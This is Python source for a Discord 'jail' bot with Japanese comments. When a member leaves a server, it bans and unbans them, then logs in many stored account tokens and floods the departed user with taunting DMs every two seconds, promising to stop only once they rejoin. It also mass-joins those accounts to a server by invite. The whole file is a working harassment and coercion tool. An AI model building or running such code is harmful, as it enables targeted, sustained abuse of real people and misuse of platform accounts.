import discord
from discord.ext import commands
import asyncio
from datetime import datetime
import os

# ========== 牢屋設定 ==========
# 🔽 サーバーID指定は不要になりました！
JOIN_LOG_CHANNEL = 1540519816719237190
LEAVE_LOG_CHANNEL = 1540519875825631384
INVITE_LINK = "https://discord.gg/SB2hn9eV8"

DM_TEXT = f"""脱走しようとしたね？お前は逃げれないよww😂
牢屋に戻らない限りスパムし続けるよwwww
スパムやめて欲しかったら牢屋に戻れwww

🔗 ここから戻れ：{INVITE_LINK}
"""

TOKENS_FILE = "dm_tokens.txt"

intents = discord.Intents.all()
intents.members = True
bot = commands.Bot(command_prefix="/", intents=intents)
bot.remove_command("help")

# ========== 管理データ ==========
dm_clients = {}       # {名前: {client, token, alive}}
active_tasks = {}
spam_interval = 2     # 各垢の送信間隔（秒）

# ========== ファイル入出力 ==========
def load_tokens():
    if not os.path.exists(TOKENS_FILE):
        return {}
    tokens = {}
    with open(TOKENS_FILE, "r", encoding="utf-8") as f:
        for line in f:
            line = line.strip()
            if "=" in line:
                name, token = line.split("=", 1)
                tokens[name.strip()] = token.strip()
    return tokens

def save_token_file(name, token):
    tokens = load_tokens()
    tokens[name] = token
    tokens[name] = token
    with open(TOKENS_FILE, "w", encoding="utf-8") as f:
        for n, t in tokens.items():
            f.write(f"{n}={t}\n")

def remove_token_file(name):
    tokens = load_tokens()
    if name in tokens:
        del tokens[name]
        with open(TOKENS_FILE, "w", encoding="utf-8") as f:
            for n, t in tokens.items():
                f.write(f"{n}={t}\n")
        return True
    return False

# ========== DM垢接続管理 ==========
async def connect_dm_client(name: str, token: str):
    """DM垢を接続し死活状態を管理"""
    if name in dm_clients:
        try: await dm_clients[name]["client"].close()
        except: pass

    client = discord.Client(intents=discord.Intents.default())
    dm_clients[name] = {"client": client, "token": token, "alive": False}

    @client.event
    async def on_ready():
        dm_clients[name]["alive"] = True
        print(f"🟢 DM垢ログイン成功: {client.user} (@{name})")

    try:
        await client.login(token)
        asyncio.create_task(client.connect())
        await asyncio.sleep(2)
        return dm_clients[name]["alive"]
    except Exception as e:
        dm_clients[name]["alive"] = False
        print(f"🔴 DM垢ログイン失敗 [{name}]: {e}")
        return False

# ========== 🛠 管理コマンド ==========
@bot.command(name="set_token")
async def set_token_cmd(ctx, name: str, token: str):
    """/set_token 名前 トークン → DM垢を追加"""
    if not ctx.author.guild_permissions.administrator:
        return await ctx.send("❌ 管理者専用コマンド")
    
    res = await connect_dm_client(name, token)
    save_token_file(name, token)
    if res:
        await ctx.send(f"✅ DM垢「{name}」登録完了！🟢 生きてます")
    else:
        await ctx.send(f"⚠️ DM垢「{name}」登録しましたがログイン不可 🔴 トークン確認")

@bot.command(name="status")
async def status_cmd(ctx):
    """/status → 全DM垢の死活状態を一覧表示"""
    if not dm_clients:
        return await ctx.send("📋 DM垢 未登録")
    
    lines = ["📋 **DM垢 死活一覧**"]
    alive_count = 0
    for name, info in dm_clients.items():
        status = "🟢 生" if info["alive"] else "🔴 死"
        if info["alive"]: alive_count += 1
        try:
            username = info["client"].user or "未ログイン"
        except:
            username = "エラー"
        lines.append(f"{status} **{name}** — {username}")
    
    lines.append(f"\n✅ 生きてる: {alive_count} / 計{len(dm_clients)}")
    await ctx.send("\n".join(lines))

@bot.command(name="remove_dm")
async def remove_dm_cmd(ctx, name: str):
    """/remove_dm 名前 → DM垢を削除"""
    if name in dm_clients:
        try: await dm_clients[name]["client"].close()
        except: pass
        del dm_clients[name]
        remove_token_file(name)
        await ctx.send(f"✅ DM垢「{name}」削除")
    else:
        await ctx.send("❌ その名前は存在しません")

# ✅ 【自動判別版】実行したサーバーに全DM垢を一斉入室
@bot.command(name="join_all")
async def join_all_cmd(ctx):
    """/join_all → 【自動】このサーバーに生きてるDM垢を全員入室"""
    if not ctx.author.guild_permissions.administrator:
        return await ctx.send("❌ 管理者専用コマンド")

    # ✅ コマンドを実行したサーバーを自動取得
    guild = ctx.guild
    if not guild:
        return await ctx.send("❌ サーバーが取得できませんでした")

    # 招待コード抽出
    invite_code = INVITE_LINK.split("/")[-1]

    await ctx.send(
        f"🚀 **全DM垢 一斉入室処理開始**\n"
        f"📍 対象サーバー: **{guild.name}** (ID: `{guild.id}`)\n"
        f"👥 対象アカウント: {len(dm_clients)}体"
    )

    success = []
    failed = []

    for name, info in dm_clients.items():
        if not info["alive"]:
            failed.append(f"🔴 {name}：未ログイン")
            continue

        try:
            # 招待を取得して入室
            invite = await info["client"].fetch_invite(invite_code)
            await info["client"].accept_invite(invite)
            success.append(f"🟢 {name}：✅ 入室成功")
            print(f"✅ [{name}] サーバー「{guild.name}」入室完了")
            await asyncio.sleep(1.5)  # レート制限対策
        except Exception as e:
            failed.append(f"⚠️ {name}：❌ 失敗 ({type(e).__name__})")
            print(f"🔴 [{name}] 入室失敗: {e}")

    # 結果報告
    result = ["📊 **入室結果**\n"]
    if success:
        result.append("✅ 成功したアカウント:")
        result.extend([f"  {s}" for s in success])
    if failed:
        result.append("\n❌ 失敗したアカウント:")
        result.extend([f"  {f}" for f in failed])
    result.append(f"\n📈 まとめ: 成功 {len(success)}体 / 失敗 {len(failed)}体")

    await ctx.send("\n".join(result))


# ========== 😈 同時並行スパム ==========
async def spam_worker(user, client, name):
    """1垢分の送信タスク：永遠に送り続ける"""
    count = 0
    while True:
        try:
            await user.send(DM_TEXT)
            count += 1
            print(f"✅ [{name}] → {user.name} ({count}通目)")
        except Exception as e:
            dm_clients[name]["alive"] = False
            print(f"🔴 [{name}] 送信失敗: {type(e).__name__} → 一時停止")
            await asyncio.sleep(5)
            continue

        if not dm_clients[name]["alive"]:
            dm_clients[name]["alive"] = True

        await asyncio.sleep(spam_interval)

        # どのサーバーでも良いが、入室ログ用にGUILD_IDを使う
        guild = bot.get_guild(JOIN_LOG_CHANNEL)
        if guild and guild.get_member(user.id):
            print(f"✅ {user.name} 収容 → 全スパム停止")
            return

async def spam_loop(user_id: int):
    """脱走を検知したサーバーで実行"""
    # 全サーバーを走査してユーザーが居たサーバーを特定
    target_guild = None
    for g in bot.guilds:
        if g.get_member(user_id):
            target_guild = g
            break
    # 退出後は直接取得できないので、ログチャンネルから逆引き
    if not target_guild:
        log_ch = bot.get_channel(JOIN_LOG_CHANNEL)
        if log_ch:
            target_guild = log_ch.guild
    if not target_guild:
        print("⚠️ 対象サーバーを特定できません")
        return

    try:
        await target_guild.ban(discord.Object(id=user_id), reason="脱走試行", delete_message_days=0)
        await asyncio.sleep(0.5)
        await target_guild.unban(discord.Object(id=user_id))
        print(f"⚡ BAN→解除実行: ユーザーID:{user_id} @ {target_guild.name}")
    except Exception as e:
        print(f"⚠️ BAN/解除エラー: {e}")

    log_ch = bot.get_channel(LEAVE_LOG_CHANNEL)
    alive_list = [n for n, i in dm_clients.items() if i["alive"]]
    if log_ch:
        await log_ch.send(
            f"🚨 **脱走検知 → BAN→解除＋同時スパム起動**\n"
            f"👤 <@{user_id}> (`{user_id}`)\n"
            f"🏠 サーバー: {target_guild.name}\n"
            f"🟢 生きてる垢: {len(alive_list)}体\n"
            f"📨 同時並行送信中…"
        )

    # ユーザー情報を取得
    user = await bot.fetch_user(user_id)
    if not user:
        return

    tasks = []
    for name, info in dm_clients.items():
        if info["alive"]:
            t = asyncio.create_task(spam_worker(user, info["client"], name))
            tasks.append(t)
    
    if not tasks:
        if log_ch:
            await log_ch.send("⚠️ **生きてるDM垢が0体です！`/set_token` で追加してください**")
        return

    await asyncio.wait(tasks, return_when=asyncio.FIRST_COMPLETED)
    for t in tasks:
        t.cancel()

    if log_ch:
        await log_ch.send(f"✅ <@{user_id}> が収容されました。スパム停止。")


@bot.event
async def on_member_remove(member):
    if member.id in active_tasks:
        return
    task = asyncio.create_task(spam_loop(member.id))
    active_tasks[member.id] = task

@bot.event
async def on_member_join(member):
    """再入室時：スパム停止＋ログ"""
    if member.id in active_tasks:
        active_tasks.pop(member.id).cancel()

    log_ch = bot.get_channel(JOIN_LOG_CHANNEL)
    alive_count = sum(1 for i in dm_clients.values() if i["alive"])
    if log_ch and log_ch.guild == member.guild:
        await log_ch.send(
            f"🔒 **収容** {member.mention}\n"
            f"🏠 サーバー: {member.guild.name}\n"
            f"💀 再脱走時は{alive_count}体同時で迎撃"
        )

# ========== 起動 ==========
@bot.event
async def on_ready():
    saved = load_tokens()
    for name, token in saved.items():
        await connect_dm_client(name, token)
        await asyncio.sleep(1)

    alive_count = sum(1 for i in dm_clients.values() if i["alive"])
    print("="*70)
    print(f"🔒 牢屋Bot起動: {bot.user}")
    print(f"📋 登録: {len(dm_clients)}体 / 🟢生: {alive_count}体")
    print(f"⚡ 脱走時: BAN→解除＋全垢同時スパム")
    print(f"🚀 入室コマンド: /join_all （サーバー自動判別）")
    print("="*70)
    await bot.change_presence(activity=discord.Game(name=f"😈 /join_allで自動入室｜{alive_count}体同時"))


def get_bot_token():
    token = os.getenv("LOOP_BOT_TOKEN")  # Railwayの環境変数に合わせる
    if not token: raise RuntimeError("LOOP_BOT_TOKEN 未設定")
    return token


if __name__ == "__main__":
    bot.run(get_bot_token())